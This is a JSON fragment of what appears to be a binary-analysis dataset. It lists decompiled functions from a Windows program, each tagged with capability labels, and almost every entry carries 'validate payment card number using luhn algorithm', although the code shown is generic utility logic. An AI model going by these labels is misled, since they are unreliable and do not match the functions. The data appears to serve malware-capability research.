        "decompiled_code": "\nvoid fcn.00031204(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *0xfffff78000000014 + -0x19db1ded53e8000 +\n            SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(*0xfffff78000000014 + -0x19db1ded53e8000) >> 0x40, 0);\n    if (arg1 != NULL) {\n        *arg1 = (iVar1 >> 0x17) - (iVar1 >> 0x3f);\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "00031318": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00031318(ulong arg1)\n\n{\n    if (arg1 - 0x61U < 0x1a) {\n        arg1._0_4_ = arg1 + -0x20;\n    }\n    return arg1;\n}\n",
        "token_count": 60
    },
    "000314b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.000314b8(ulong arg1, ulong arg2, ulong arg3, char *arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t arg1_00;\n    int64_t iVar4;\n    uint32_t uVar5;\n    ulong uStack152;\n    uchar auStack144 [16];\n    uchar auStack128 [16];\n    uint auStack112 [2];\n    ulong uStack104;\n    uchar *puStack96;\n    uint uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    \n    arg1_00 = fcn.0001ca70(1, 0x208, 0x7346744e);\n    if (arg1_00 != 0) {\n        uVar5 = 0;\n        do {\n            fcn.00044350(arg4, 0x104, 0x14210, arg1);\n            fcn.00031398(arg1_00, 0x104, arg4);\n            fcn.00066704(auStack144, arg1_00);\n            puStack96 = auStack144;\n            auStack112[0] = 0x30;\n            uStack104 = 0;\n            uStack88 = 0x40;\n            uStack80 = 0;\n            uStack72 = 0;\n            iVar2 = fcn.0001e364(&uStack152, 2, auStack112, auStack128, 0, 0x100, 0, 2, 0, 0, 0);\n            if (iVar2 == 0) {\n                fcn.000666f2(uStack152);\n                break;\n            }\n            uVar3 = fcn.00066782();\n            fcn.00030e10(uVar3);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 100);\n        fcn.00030d24(arg1_00);\n        iVar4 = -1;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            cVar1 = *arg4;\n            arg4 = arg4 + 1;\n        } while (cVar1 != '\\0');\n        arg1_00 = ~iVar4 - 1;\n    }\n    return arg1_00;\n}\n",
        "token_count": 527
    },
    "00031630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00031630(int64_t *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    \n    if (arg3 == 0) {\n        fcn.00030d24(*arg1);\n        *arg1 = 0;\n    }\n    else {\n        iVar1 = fcn.00030cc4(arg3);\n        if (iVar1 == 0) {\n            return 0xffffffff;\n        }\n        if (arg3 < arg2) {\n            arg2 = arg3;\n        }\n        fcn.0006670a(iVar1, *arg1, arg2);\n        fcn.00030d24(*arg1);\n        *arg1 = iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 169
    },
    "00031818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00031818(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    uint32_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint auStack136 [2];\n    uchar auStack128 [16];\n    uchar auStack112 [16];\n    uint auStack96 [2];\n    ulong uStack88;\n    uchar *puStack80;\n    uint uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    \n    uVar2 = 0;\n    if ((arg2 & 8) != 0) {\n        uVar2 = 4;\n    }\n    uVar4 = 1;\n    if (((arg2 >> 8 & 1) != 0) && (uVar4 = 3,  (arg2 >> 10 & 1) != 0)) {\n        uVar4 = 2;\n    }\n    uVar3 = 0;\n    if ((arg2 & 3) == 0) {\n        uVar2 = uVar2 | 1;\n        uVar3 = 3;\n    }\n    if ((arg2 & 2) != 0) {\n        uVar2 = uVar2 | 3;\n    }\n    if ((arg2 >> 9 & 1) != 0) {\n        uVar4 = 5;\n    }\n    if ((arg2 & 1) != 0) {\n        uVar2 = uVar2 & 0xfffffffe | 2;\n    }\n    arg1_00 = fcn.0001ca70(1, 0x208, 0x7346744e);\n    if (arg1_00 != 0) {\n        fcn.00031420(arg1_00, 0x104, arg1);\n        fcn.00066704(auStack128, arg1_00);\n        puStack80 = auStack128;\n        auStack96[0] = 0x30;\n        uStack88 = 0;\n        uStack72 = 0x40;\n        uStack64 = 0;\n        uStack56 = 0;\n        iVar1 = fcn.0001e364(auStack136, uVar2 | 0x100000, auStack96, auStack112, 0, 0x80, uVar3, uVar4, 0x10, 0, 0);\n        fcn.00030d24(arg1_00);\n        if (iVar1 == 0) {\n            return auStack136[0];\n        }\n        uVar2 = fcn.00066782();\n        fcn.00030e10(uVar2);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 610
    },
    "0003198c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0003198c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.0001ca70(1, 0x208, 0x7346744e);\n    if (arg1_00 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.00031398(arg1_00, 0x104, arg1);\n        uVar1 = fcn.00031818(arg1_00, arg2, 0, arg4);\n        fcn.00030d24(arg1_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 165
    },
    "00031a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00031a48(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t arg1_00;\n    uchar auStack88 [16];\n    uint auStack72 [2];\n    ulong uStack64;\n    uchar *puStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    arg1_00 = fcn.0001ca70(1, 0x208, 0x7346744e);\n    if (arg1_00 != 0) {\n        fcn.00031420(arg1_00, 0x104, arg1);\n        fcn.00066704(auStack88, arg1_00);\n        puStack56 = auStack88;\n        auStack72[0] = 0x30;\n        uStack64 = 0;\n        uStack48 = 0x40;\n        uStack40 = 0;\n        uStack32 = 0;\n        iVar1 = fcn.00066734(auStack72);\n        fcn.00030d24(arg1_00);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        uVar2 = fcn.00066782();\n        fcn.00030e10(uVar2);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 299
    },
    "00031afc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00031afc(ulong arg1)\n\n{\n    uint uVar1;\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.0001ca70(1, 0x208, 0x7346744e);\n    if (arg1_00 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.00031398(arg1_00, 0x104, arg1);\n        uVar1 = fcn.00031a48(arg1_00);\n        fcn.00030d24(arg1_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 144
    },
    "00031d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get system information on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00031d40(int64_t *arg1, uint32_t *arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t aiStackX8 [4];\n    uint16_t uStack72;\n    uint16_t uStack70;\n    uint16_t uStack68;\n    uint16_t uStack66;\n    uint16_t uStack64;\n    uint16_t uStack62;\n    uint16_t uStack60;\n    uchar auStack56 [16];\n    int64_t iStack40;\n    \n    iVar2 = (*arg1 + 0x2b6109100) * 10000000;\n    aiStackX8[0] = iVar2;\n    iVar1 = fcn.0006687e(3, auStack56, 0x20);\n    if (iVar1 == 0) {\n        aiStackX8[0] = iVar2 - iStack40;\n    }\n    fcn.00031b54(aiStackX8, &uStack72);\n    arg2[3] = uStack66;\n    arg2[2] = uStack64;\n    arg2[1] = uStack62;\n    arg2[8] = 0;\n    arg2[7] = 0;\n    arg2[4] = uStack70 - 1;\n    *arg2 = uStack60;\n    arg2[6] = uStack68;\n    arg2[5] = uStack72 - 0x76c;\n    return;\n}\n",
        "token_count": 334
    },
    "00031df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00031df0(ulong param_1)\n\n{\n    fcn.00031d40(param_1, 0x7f8a0);\n    return 0x7f8a0;\n}\n",
        "token_count": 49
    },
    "0003206c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003206c(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong auStackX16 [3];\n    \n    if (*0x7f8d4 == 0) {\n        iVar1 = (*_fcn.00011220)(auStackX16, 0, 0, 0, 0, 0x3203c, 0x7f8d4);\n        if (iVar1 == 0) {\n            fcn.000667be(auStackX16[0], 0, 0);\n            fcn.000666f2(auStackX16[0]);\n            if (*0x7f8d4 != 0) goto code_r0x000320dd;\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x000320dd:\n        *arg1 = *0x7f8d4;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 224
    },
    "000324b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000324b8(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        fcn.00030d24(arg1);\n    }\n    return;\n}\n",
        "token_count": 43
    },
    "00032710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00032710(ulong *arg1)\n\n{\n    fcn.000666f2(*arg1);\n    *arg1 = 0;\n    arg1[1] = 0;\n    return;\n}\n",
        "token_count": 49
    },
    "00032748": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00032748(ulong *arg1, uint *arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    \n    iVar1 = fcn.000667be(*arg1, 0, 0);\n    if (iVar1 == 0) {\n        if (arg2 != NULL) {\n            *arg2 = 0xffffffff;\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar2 = fcn.00066782();\n        fcn.00030e10(uVar2);\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 147
    },
    "00032794": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00032794(ulong *arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong auStackX16 [3];\n    \n    iVar1 = (*_fcn.00011150)(*arg1, 0, **0x11458, 0, auStackX16, 0);\n    if (iVar1 == 0) {\n        (*_fcn.000115b8)(auStackX16[0]);\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "000327e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000327e0(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.000667ac();\n    *(arg1 + 8) = uVar1;\n    return 0;\n}\n",
        "token_count": 54
    },
    "000327fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000327fc(ulong *arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong auStackX16 [3];\n    \n    iVar1 = (*_fcn.00011150)(*arg1, 0, **0x11458, 0, auStackX16, 0);\n    if (iVar1 == 0) {\n        (**0x11460)(auStackX16[0], 0x1f);\n        (*_fcn.000115b8)(auStackX16[0]);\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00066782(iVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 157
    },
    "00032c3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nint64_t fcn.00032c3c(uint32_t *arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    uint *puVar2;\n    int64_t iVar3;\n    uint uStackX24;\n    uint uStackX28;\n    \n    arg1_00 = fcn.00030c98(0x1a);\n    if (arg1_00 != 0) {\n        fcn.00032994(arg1_00);\n        uStackX24 = fcn.00030dc8(*arg1);\n        uStackX28 = fcn.00030dc8(arg1[1]);\n        puVar2 = &uStackX24;\n        iVar3 = 8;\n        do {\n            *puVar2 = *puVar2 ^ *((arg1_00 - &uStackX24) + puVar2);\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        iVar1 = fcn.0002ffac(&uStackX24, arg1_00 + 10, 8);\n        *(arg2 + 8) = arg1_00;\n        *(arg2 + 0x10) = iVar1 + 10;\n        arg1_00 = 1;\n    }\n    return arg1_00;\n}\n",
        "token_count": 308
    },
    "00032ccc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00032ccc(void)\n\n{\n    fcn.0006677c(0x7f8e0, 0, 0x28);\n    fcn.000324cc(0x7f8f0);\n    *0x7f8d8 = 0xffffffff;\n    return 0;\n}\n",
        "token_count": 72
    },
    "00032d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00032d00(void)\n\n{\n    uchar auStackX8 [32];\n    \n    fcn.00032650(0x7f8f0, auStackX8, 0);\n    fcn.00032684(0x7f8f0, auStackX8, 0);\n    return;\n}\n",
        "token_count": 74
    },
    "00032d34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00032d34(ulong arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x7f8e0;\n    if (arg2 == 0) {\n        fcn.00032650(0x7f8f0, auStackX24, 0);\n        puVar1 = *0x7f8e0;\n    }\n    for (; (puVar1 != NULL && (*(puVar1 + 2) != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00032684(0x7f8f0, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 178
    },
    "00032d94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00032d94(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    \n    fcn.00032650(0x7f8f0, auStackX32, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        fcn.00066740(arg2, iVar1 + 0x232);\n        *(arg2 + -2 + arg3 * 2) = 0;\n    }\n    fcn.00032684(0x7f8f0, auStackX32, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 178
    },
    "00032e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00032e10(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    \n    fcn.00032650(0x7f8f0, auStackX32, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        fcn.00066740(arg2, iVar1 + 0x32);\n        *(arg2 + -2 + arg3 * 2) = 0;\n    }\n    fcn.00032684(0x7f8f0, auStackX32, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 178
    },
    "00032f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00032f00(ulong arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *arg2 = *(iVar1 + 0x444);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 149
    },
    "00032f64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00032f64(ulong arg1, ulong *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *arg2 = *(iVar1 + 8);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 147
    },
    "00032fc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00032fc8(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 1);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *(iVar1 + 8) = arg2;\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 1);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 146
    },
    "00033030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00033030(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    uchar auStack56 [24];\n    \n    fcn.00032650(0x7f8f0, auStack56, 1);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *(iVar1 + 8) = arg2;\n        *(iVar1 + 0x478) = arg3;\n        *(iVar1 + 0x488) = in_stack_00000028;\n        *(iVar1 + 0x480) = arg4;\n        *(iVar1 + 0x490) = in_stack_00000030;\n    }\n    fcn.00032684(0x7f8f0, auStack56, 1);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 232
    },
    "000330cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.000330cc(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    \n    fcn.00032650(0x7f8f0, auStackX32, 1);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        if (6 < arg3) {\n            arg3._0_4_ = 6;\n        }\n        fcn.0006670a(iVar1 + 0x2c, arg2, arg3);\n    }\n    fcn.00032684(0x7f8f0, auStackX32, 1);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 184
    },
    "0003314c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0003314c(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 1);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        fcn.00066740(iVar1 + 0x232, arg2, 0x100);\n        *(iVar1 + 0x430) = 0;\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 1);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 172
    },
    "000331cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.000331cc(ulong arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *arg2 = *(iVar1 + 0x18);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 148
    },
    "0003322c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0003322c(ulong arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *arg2 = *(iVar1 + 0x1c);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 150
    },
    "000332f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.000332f8(ulong arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *arg2 = *(iVar1 + 0x460);\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 149
    },
    "000333b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000333b0(ulong arg1, uint *arg2)\n\n{\n    ulong uVar1;\n    ulong *puVar2;\n    uchar auStackX24 [16];\n    \n    uVar1 = 0x21590005;\n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    puVar2 = *0x7f8e0;\n    do {\n        if (puVar2 == NULL) {\ncode_r0x000333f7:\n            fcn.00032684(0x7f8f0, auStackX24, 0);\n            return uVar1;\n        }\n        if (*(puVar2 + 0x14) == arg1) {\n            uVar1 = 0;\n            *arg2 = *(puVar2 + 2);\n            goto code_r0x000333f7;\n        }\n        puVar2 = *puVar2;\n    } while( true );\n}\n",
        "token_count": 215
    },
    "0003350c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003350c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    uchar auStackX32 [8];\n    uchar auStack568 [16];\n    uchar auStack552 [512];\n    \n    iVar4 = 0;\n    fcn.00032650(0x7f8f0, auStack568, 0);\n    iVar2 = fcn.00032d34(arg1, 1);\n    if (iVar2 != 0) {\n        iVar4 = *(iVar2 + 0x18);\n    }\n    fcn.00032684(0x7f8f0, auStack568, 0);\n    if (iVar2 == 0) {\n        uVar3 = 0xc000000e;\n    }\n    else {\n        fcn.00032e88(arg1, auStackX32, 6);\n        cVar1 = (*_fcn.000115f8)();\n        if (cVar1 == '\\0') {\n            fcn.00032d94(arg1, auStack552, 0x100);\n        }\n        if (iVar4 == 0) {\n            uVar3 = fcn.00046678(arg1, arg2, arg3);\n        }\n        else {\n            uVar3 = fcn.0003a6a4(arg1, arg2, arg3);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 332
    },
    "00033674": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00033674(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x444) = arg2;\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 147
    },
    "000336d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.000336d4(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    \n    fcn.00032650(0x7f8f0, auStackX32, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x468) = arg2;\n        *(iVar1 + 0x470) = arg3;\n    }\n    fcn.00032684(0x7f8f0, auStackX32, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 166
    },
    "00033744": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00033744(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x18) = arg2;\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    return ~-(iVar1 != 0) & 0xc000000e;\n}\n",
        "token_count": 147
    },
    "000339c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000339c4(ulong arg1, int64_t *arg2, uint32_t *arg3)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uchar auStackX32 [8];\n    \n    uVar4 = 0;\n    fcn.00032650(0x7f8f0, auStackX32, 0);\n    iVar2 = fcn.00032d34(arg1, 1);\n    if (iVar2 != 0) {\n        uVar1 = *(iVar2 + 0x440);\n        *arg3 = uVar1;\n        if ((*(iVar2 + 0x438) != 0) && (arg2 != NULL)) {\n            iVar3 = fcn.00030cc4(uVar1);\n            *arg2 = iVar3;\n            if (iVar3 == 0) {\n                uVar4 = 0x21590004;\n            }\n            else {\n                fcn.0006670a(iVar3, *(iVar2 + 0x438));\n                uVar4 = 0;\n            }\n        }\n    }\n    fcn.00032684(0x7f8f0, auStackX32, 0);\n    if (iVar2 == 0) {\n        uVar4 = 0xc000000e;\n    }\n    return uVar4;\n}\n",
        "token_count": 313
    },
    "00033bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00033bf0(ulong arg1)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    ulong *arg1_00;\n    ulong *puVar3;\n    uchar auStackX16 [24];\n    \n    fcn.00032650(0x7f8f0, auStackX16, 1);\n    puVar3 = NULL;\n    puVar1 = *0x7f8e0;\njoined_r0x00033c1e:\n    arg1_00 = puVar1;\n    puVar2 = puVar3;\n    if (arg1_00 == NULL) {\n        fcn.00032684(0x7f8f0, auStackX16, 1);\n        return;\n    }\n    puVar1 = *arg1_00;\n    puVar3 = arg1_00;\n    if (*(arg1_00 + 3) == 0) goto code_r0x00033c32;\n    if (arg1 == 0) goto code_r0x00033c2e;\n    goto code_r0x00033c36;\ncode_r0x00033c2e:\n    if (*(arg1_00 + 3) == 0) {\ncode_r0x00033c32:\n        if (arg1 == 0) {\ncode_r0x00033c36:\n            puVar3 = puVar1;\n            if (puVar2 != NULL) {\n                *puVar2 = puVar1;\n                puVar3 = *0x7f8e0;\n            }\n            *0x7f8e0 = puVar3;\n            *0x7f8e8 = *0x7f8e8 + -1;\n            fcn.000326c0(arg1_00 + 0x89);\n            fcn.0002fc94(arg1_00 + 4);\n            fcn.00030d24(arg1_00[0x87]);\n            fcn.00030d24(arg1_00);\n            puVar3 = puVar2;\n        }\n    }\n    goto joined_r0x00033c1e;\n}\n",
        "token_count": 470
    },
    "00033ca4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00033ca4(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [8];\n    ulong uStackX32;\n    \n    fcn.00032650(0x7f8f0, auStackX24, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        uStackX32 = *(iVar1 + 0x20);\n        *(iVar1 + 0x28) = arg2;\n    }\n    fcn.00032684(0x7f8f0, auStackX24, 0);\n    if (iVar1 != 0) {\n        fcn.0002fcb8(&uStackX32);\n    }\n    return;\n}\n",
        "token_count": 180
    },
